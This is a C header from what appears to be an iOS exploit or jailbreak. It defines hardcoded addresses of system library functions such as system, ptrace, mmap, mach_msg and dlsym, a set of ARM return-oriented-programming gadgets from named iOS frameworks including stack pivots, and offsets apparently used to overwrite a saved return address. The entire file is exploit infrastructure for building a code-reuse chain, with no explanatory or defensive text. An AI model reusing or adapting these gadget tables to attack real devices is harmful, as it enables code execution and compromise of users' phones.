#define STRLEN_PID		3
#define STRLEN_FILENAME		66
#define LOG_SHIFT		(16 + STRLEN_PID + STRLEN_FILENAME)

#define P1				404
#define P2				619
#define P3				625

#define P3_ADDR_LO			0xe4 + (P3 - P2) * 4;
#define LR_ADDR_LO			0xe8

// libsystem_kernel.dylib
#define _dsc_open			0x35c72dc4
#define _dsc_fstat                      0x35c636f4
#define _dsc_memcpy                     (0x35c6398c + 1)
#define _dsc_munmap                     0x35c72d68
#define _dsc_unlink                     (0x35c64eb4 + 1)
#define _dsc_mkdir			0x35c65c34
#define _dsc_ftruncate			0x35c65ca0
#define _dsc_ioctl			(0x35c64bf8 + 1)
#define _dsc_close			0x35c6371c
#define _dsc_ptrace			0x35c73394

// libsystem_c.dylib
#define _dsc_fopen			(0x32aff004 + 1)
#define _dsc_fread			(0x32b05814 + 1)
#define _dsc_fclose			(0x32aff65c + 1)
#define _dsc_exit			(0x32b019d0 + 1)
#define _dsc_syslog			(0x32af9ad0 + 1)
#define _dsc_sysctl			(0x32af6c64 + 1)
#define _dsc_malloc			(0x32af6184 + 1)
#define _dsc_memmem			(0x32b0fcf0 + 1)
#define _dsc_sleep			(0x32b0da54 + 1)
#define _dsc_bootstrap_look_up		(0x314bffe8 + 1)
#define _dsc_bsdthread_terminate	0x35c72228
#define _dsc_chown                      0x35c65518

#define LIBC_POP_R0			0x32b66340
// __aeabi_cfcmpeq+0x10
#define LIBC_POP_R0123			0x32b66b10
#define LIBC_POP_R47			(0x32b19f3e + 1)
#define LIBC_MOV_SP_R4__POP_R47		(0x32b1fcd8 + 1)
#define LIBC_STR_R0_R4__POP_R47		(0x32b3349a + 1)
#define LIBC_LDR_R0_R0__POP_R7		(0x32af94b4 + 1)
#define LIBC_SUB_R0_R4__POP_R4567	(0x32b1e246 + 1)

// libxpc.dylib
#define LIBC_BLX_R4_POP_R457		(0x3765d39c + 1)

// offsets according to planetbeing's extract of dsc

// /System/Library/Frameworks/CoreMotion.framework/CoreMotion
#define GADGET_SUBS_R0_R0_R1__POP7      (0x3294f748 + 1)

// /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
#define GADGET_MOV_R1_R0__POP_R47       (0x34f509cc + 1)

// /System/Library/Frameworks/AddressBook.framework/AddressBook
#define GADGET_MOV_R0_R1__POP_R47       (0x36c0d26e + 1)
#define GADGET_MOV_R0_R4__POP_R47       (0x36c10d5c + 1)

// /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
#define GADGET_MOV_R1_R4__POP_R47       (0x3307e0e4 + 1)

// /System/Library/PrivateFrameworks/DataDetectorsCore.framework/DataDetectorsCore
#define GADGET_ADD_R0_R0_R1__POP457     0x376ebae8

// libsystem_c.dylib
#define _dsc_proc_pidinfo               (0x32afe4e0 + 1)
#define _dsc_system                     (0x32b0d814 + 1)
#define _dsc_strcpy                     0x32afbd30
#define _dsc_sys_dcache_flush           0x32b0780c

// libsystem_kernel.dylib
#define _dsc_shm_open                   0x35c654a8
#define _dsc_mmap                       (0x35c63658 + 1)
#define _dsc_mach_task_self             (0x35c71d88 + 1)
#define _dsc_mach_port_allocate         (0x35c63e44 + 1)
#define _dsc_mach_port_insert_right     (0x35c63e70 + 1)
#define _dsc_mach_msg		        (0x35c631d4 + 1)

// libdyld.dylib
#define _dsc_dlsym                      (0x333fd6ec + 1)

// notifyd stuff

// pthread_mutex_lock+0x1B6
#define GADGET_MOV_SP_R4_POP8_10_11_4567   (0x32af1c82 + 1)

// uloc_toLanguageTag+0x24B2
#define GADGET_ADD_SP_120_POP8_10_4567     (0x312efe2e + 1)

// xmlRegisterInputCallbacks+0x36
#define GADGET_MOV_LR_R4_MOV_R0_LR_POP47   (0x3707001a + 1)

// /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
// vt_Copy_420f_420v_arm+0x220
// 35982100        e28dd008        add     sp, sp, #8      @ 0x8
// 35982104        ecbd8b08        vldmia  sp!, {d8-d11}
// 35982108        ecbdcb08        vldmia  sp!, {d12-d15}
// 3598210c        e8bd0d00        pop     {r8, sl, fp}
// 35982110        e8bd80f0        pop     {r4, r5, r6, r7, pc}
#define GADGET_HOLY                        0x35982100
